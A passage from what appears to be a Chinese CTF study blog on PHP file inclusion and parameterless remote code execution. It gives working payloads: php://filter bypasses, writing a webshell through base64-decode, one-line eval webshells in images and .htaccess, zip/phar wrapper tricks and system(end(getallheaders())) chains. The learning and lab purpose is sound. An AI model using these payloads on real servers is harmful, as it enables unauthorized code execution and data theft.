class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;FTIfoT8tI29loTD=&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;2�?-#oe�0&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>

<p>在使用 <code>管道符 |</code> 连接多个过滤器时，<strong>与管道符之间存在空格的过滤器均将失效</strong>。</p>
<h5 id="过滤器被ban"><a href="#过滤器被ban" class="headerlink" title="过滤器被ban"></a>过滤器被ban</h5><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//filter/convert.BAse64-encode/resource=/flag</span></span><br></pre></td></tr></table></figure>

<h6 id="convert-iconv转编码"><a href="#convert-iconv转编码" class="headerlink" title="convert.iconv转编码"></a><code>convert.iconv</code>转编码</h6><p>用法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=filepath</span></span><br><span class="line">比如</span><br><span class="line">php:<span class="comment">//filter/convert.iconv.ASCII.UCS-2BE/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.utf-8.utf-7/resource=index.php</span></span><br></pre></td></tr></table></figure>

<p>php支持的编码格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">UCS-<span class="number">4</span>*</span><br><span class="line">UCS-<span class="number">4</span>BE</span><br><span class="line">UCS-<span class="number">4</span>LE*</span><br><span class="line">UCS-<span class="number">2</span></span><br><span class="line">UCS-<span class="number">2</span>BE</span><br><span class="line">UCS-<span class="number">2</span>LE</span><br><span class="line">UTF-<span class="number">32</span>*</span><br><span class="line">UTF-<span class="number">32</span>BE*</span><br><span class="line">UTF-<span class="number">32</span>LE*</span><br><span class="line">UTF-<span class="number">16</span>*</span><br><span class="line">UTF-<span class="number">16</span>BE*</span><br><span class="line">UTF-<span class="number">16</span>LE*</span><br><span class="line">UTF-<span class="number">7</span></span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-<span class="number">8</span>*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-<span class="number">2022</span>-JP</span><br><span class="line">ISO-<span class="number">2022</span>-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac</span><br><span class="line">MacJapanese</span><br><span class="line">SJIS-Mobile<span class="comment">#DOCOMO</span></span><br><span class="line">SJIS-DOCOMO</span><br><span class="line">SJIS-Mobile<span class="comment">#KDDI</span></span><br><span class="line">SJIS-KDDI</span><br><span class="line">SJIS-Mobile<span class="comment">#SOFTBANK</span></span><br><span class="line">SJIS-SOFTBANK</span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#DOCOMO</span></span><br><span class="line">UTF-<span class="number">8</span>-DOCOMO</span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#KDDI-A</span></span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#KDDI-B</span></span><br><span class="line">UTF-<span class="number">8</span>-KDDI</span><br><span class="line">UTF-<span class="number">8</span>-Mobile<span class="comment">#SOFTBANK</span></span><br><span class="line">UTF-<span class="number">8</span>-SOFTBANK</span><br><span class="line">ISO-<span class="number">2022</span>-JP-MOBILE<span class="comment">#KDDI</span></span><br><span class="line">ISO-<span class="number">2022</span>-JP-KDDI</span><br><span class="line">JIS</span><br><span class="line">JIS-ms</span><br><span class="line">CP50220</span><br><span class="line">CP50220raw</span><br><span class="line">CP50221</span><br><span class="line">CP50222</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">1</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">2</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">3</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">4</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">5</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">6</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">7</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">8</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">9</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">10</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">13</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">14</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">15</span>*</span><br><span class="line">ISO-<span class="number">8859</span>-<span class="number">16</span>*</span><br><span class="line">byte2be</span><br><span class="line">byte2le</span><br><span class="line">byte4be</span><br><span class="line">byte4le</span><br><span class="line">BASE64</span><br><span class="line">HTML-ENTITIES</span><br><span class="line">HTML</span><br><span class="line"><span class="number">7</span>bit</span><br><span class="line"><span class="number">8</span>bit</span><br><span class="line">EUC-CN*</span><br><span class="line">CP936</span><br><span class="line">GB18030</span><br><span class="line">HZ</span><br><span class="line">EUC-TW*</span><br><span class="line">CP950</span><br><span class="line">BIG-<span class="number">5</span>*</span><br><span class="line">EUC-KR*</span><br><span class="line">UHC</span><br><span class="line">CP949</span><br><span class="line">ISO-<span class="number">2022</span>-KR</span><br><span class="line">Windows-<span class="number">1251</span></span><br><span class="line">CP1251</span><br><span class="line">Windows-<span class="number">1252</span></span><br><span class="line">CP1252</span><br><span class="line">CP866</span><br><span class="line">IBM866</span><br><span class="line">KOI8-R*</span><br><span class="line">KOI8-U*</span><br><span class="line">ArmSCII-<span class="number">8</span></span><br><span class="line">ArmSCII8</span><br></pre></td></tr></table></figure>

<p>使用时，可以利用burp intruder模块，将上述编码方式作为字典进行测试，找到可以使用的编码。</p>
<p>根据编码格式进行解码，就可以看到源文件。</p>
<h6 id="url二次编码"><a href="#url二次编码" class="headerlink" title="url二次编码"></a>url二次编码</h6><p>原理</p>
<p>当数据上传至浏览器的时候，默认会先解一次 <code>url</code> 编码，但 <code>php</code> 包含的 <code>filter</code> ，包含时会再解一次 <code>url</code> 编码（<code>include</code>函数解<code>urlencode</code>的特性）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=filepath</span></span><br><span class="line">php:<span class="comment">//filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=filepath</span></span><br><span class="line">php:<span class="comment">//filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=filepath</span></span><br></pre></td></tr></table></figure>

<p>注意：filter不能二次编码！</p>
<h4 id="php-filter妙用"><a href="#php-filter妙用" class="headerlink" title="php://filter妙用"></a><code>php://filter</code>妙用</h4><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>.=</code>就是拼接。前面的<code>$content</code>已经给了<code>&lt;?php exit; ?&gt;</code>，所以说不管后面是什么，都会先执行退出。导致后面的语句不执行。这也叫PHP死亡退出。</p>
<p><code>$content</code> 在开头增加了<code>exit</code>过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上<code>if(!defined(XXX)exit;)</code>之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
<p>绕过其实也很简单，POST方式提交了参数，这个是可控的，所以尝试PHP伪协议来进行写入一句话，并且使用base64-decode去除死亡退出。</p>
<p>利用<code>php://filter</code>流的<code>base64_decode</code>函数特性去除死亡<code>exit</code>，base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过，<code>&lt;?php exit; ?&gt;</code>这条代码base64解码时，会解码为<code>phpexit</code>，base64解码是<strong>四个byte</strong>一组，所以再增加一个字符，凑够两组，后面的就会正常解码</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;data=aPD9waHAgcGhwaW5mbygpOyA/Pg</span></span><br></pre></td></tr></table></figure>

<p><code>$data</code>中<code>a</code>是为了使base64解码时的phpexit变为8个字节；而<code>PD9waHAgcGhwaW5mbygpOyA/Pg</code>则是<code>&lt;?php phpinfo();?&gt;</code>的base64编码，最终可在shell.php中找到。</p>
<h3 id="包含上传文件获取服务器权限"><a href="#包含上传文件获取服务器权限" class="headerlink" title="包含上传文件获取服务器权限"></a>包含上传文件获取服务器权限</h3><h4 id="直接包含上传的图片文件"><a href="#直接包含上传的图片文件" class="headerlink" title="直接包含上传的图片文件"></a>直接包含上传的图片文件</h4><p>在网站上传位置上传木马图片<code>evil.jpg</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="number">123</span>);<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;0&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接访问<code>evil.jpg</code>，是破损的图片</p>
<p>利用文件包含漏洞，访问<code>http://127.0.0.1/includefile/test.php?file=evil.jpg</code>，可以执行<code>evil.jpg</code>的代码；</p>
<p>利用蚁剑等工具，可以获取服务器shell。</p>
<h4 id="使用压缩协议包含文件"><a href="#使用压缩协议包含文件" class="headerlink" title="使用压缩协议包含文件"></a>使用压缩协议包含文件</h4><p><code>zip://</code>、<code>bzip2://</code>、<code>zlib://</code> 协议，都属于压缩协议，可以访问压缩文件中的子文件。 </p>
<p>适用场景：有的服务器运行文件包含，但是强制给文件添加.php后缀，导致攻击者无法包含非.php后缀的文件。 </p>
<p>利用格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com?file=zip://绝对路径//test.zip%23test_filename</span></span><br></pre></td></tr></table></figure>

<p>优缺点：优点是可以绕过包含的固定后缀。缺点是需要知道文件的绝对路径</p>
<p> 演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/includefile/test.php?file=zip://D:\web13\web13app\phpstudy\PHPTutorial\WWW\includefile\1.png%231.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="使用phar协议"><a href="#使用phar协议" class="headerlink" title="使用phar协议"></a>使用<code>phar</code>协议</h4><p><code>phar://</code>协议，类似于 <code>zip</code> 协议，但是可以使用相对路径。 </p>
<p>格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//example.com/file.php?file=phar://[压缩文件绝对/相对路径]/[压缩文件内的子文件名] </span></span><br></pre></td></tr></table></figure>

<p>优缺点：优点是可以绕过包含的固定后缀。缺点：需要php的版本大于5.3.0 </p>
<p>演示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/includefile/test.php?file=phar://1.png/1.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="利用-htaccess实现文件包含"><a href="#利用-htaccess实现文件包含" class="headerlink" title="利用.htaccess实现文件包含"></a>利用<code>.htaccess</code>实现文件包含</h3><p>可以写入或者上传<code>.htaccess</code>文件时，可以在<code>.htaccess</code>中写入代码，再包含自己。</p>
<h4 id="实例及详解"><a href="#实例及详解" class="headerlink" title="实例及详解"></a>实例及详解</h4><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单分析一下，先<code>scandir函数</code>来获取指定目录 <code>./</code>下的所有文件和文件夹的列表，然后如果不为<code>index.php</code>，则<code>unlink函数</code>删除文件。接着就是对上传文件写入内容的黑名单过滤，然后对文件名正则匹配无字母。最后<code>file_put_contents</code>读取文件</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_prepend_fil\e .htaccess <span class="comment">#&lt;?php system(&#x27;cat /fla\g&#x27;);?&gt;\</span></span><br><span class="line"><span class="comment"># 别忘了url编码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_prepend_fi\le <span class="string">&quot;.htaccess&quot;</span> <span class="comment">#&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;\</span></span><br><span class="line"><span class="comment"># 一句话木马也行</span></span><br></pre></td></tr></table></figure>

<p><code>php_value auto_prepend_file</code>表示在执行本目录文件前需要包含指定的文件</p>
<p><code> \</code>的作用是拼接上下文，可以用于绕过关键字过滤</p>
<p><code>#</code>在<code>.htaccess</code>中是注释的意思，但在包含<code>.htacess</code>后不是注释（因为<code>#</code>不是php的注释符），所以可以将一句话木马写在<code>#</code>之后</p>
<p>最后的<code>\</code>是为了和代码最后面拼接的<code>\nHello,world</code>，使这部分也在<code>.htaccess</code>中被当作注释，否则<code>hello world</code>到第四行会执行报错</p>
<h3 id="require-once绕过不能重复包含文件的限制"><a href="#require-once绕过不能重复包含文件的限制" class="headerlink" title="require_once绕过不能重复包含文件的限制"></a>require_once绕过不能重复包含文件的限制</h3><p>PHP的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。</p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"> <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解题需要绕过require_once对同一文件（flag.php）只能包含一次的限制。</p>
<p>题payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/se</span></span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>原理解析：</p>
<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当软连接多到一定程度后，可以绕过这个哈希表，让php认为我们传入的文件名不在哈希表中。 </p>
<p>软连接：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>指向当前进程的/proc/pid/ </span><br><span class="line">/proc/<span class="built_in">self</span>/root/是指向/的符号链接，也就是根目录 </span><br><span class="line">/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/，多个/proc/<span class="built_in">self</span>/root/拼接起来还是根目录</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>无参数 RCE 学习记录</title>
    <url>/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE前置知识"><a href="#RCE前置知识" class="headerlink" title="RCE前置知识"></a>RCE前置知识</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>()))) </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()/<span class="title function_ invoke__">pos</span>() - 默认返回数组第一个元素</span><br><span class="line"><span class="title function_ invoke__">end</span>() – 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">next</span>() – 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">prev</span>() – 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">reset</span>() – 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">each</span>() – 返回当前元素的键名和键值，并将内部指针向前移动，用于遍历</span><br></pre></td></tr></table></figure>

<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/xjsHJqSy7uOpTEt.png" alt="image.png"></p>
<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。</p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h4><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/y4DBgjpVTUtZNe1.png" alt="image.png"></p>
<h5 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h5><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
<p><img src="https://s2.loli.net/2023/11/18/s6E1xhMGV7BkvKL.png" alt="image.png"></p>
<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示</p>
<p><img src="https://s2.loli.net/2023/11/18/XSg3hl9KVCG4pYs.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2023/11/18/vHJQlgMuDy7tYio.png" alt="image.png"></p>
<h5 id="end-被ban"><a href="#end-被ban" class="headerlink" title="end()被ban"></a><code>end()</code>被ban</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br><span class="line"><span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure>

<p>将数组倒置取第一个元素相当于<code>end()</code></p>
<p>小小举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加字段</span></span><br><span class="line">test:flag.php</span><br><span class="line"><span class="comment">#访问的url</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#显示传输的参数</span></span><br><span class="line">?code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#执行系统命令</span></span><br><span class="line">?code=<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#查看文件内容</span></span><br></pre></td></tr></table></figure>

<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
<p><img src="https://s2.loli.net/2023/11/18/klJAPxwsBIScoUa.png" alt="image.png"></p>
<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组（返回由所有已定义变量所组成的数组），我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
<p><img src="https://s2.loli.net/2023/11/18/x9yrZGsMaQTlAoK.png" alt="image.png"></p>
<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了。</p>
<p>我们还可以用以下方法得到全局变量的值：</p>
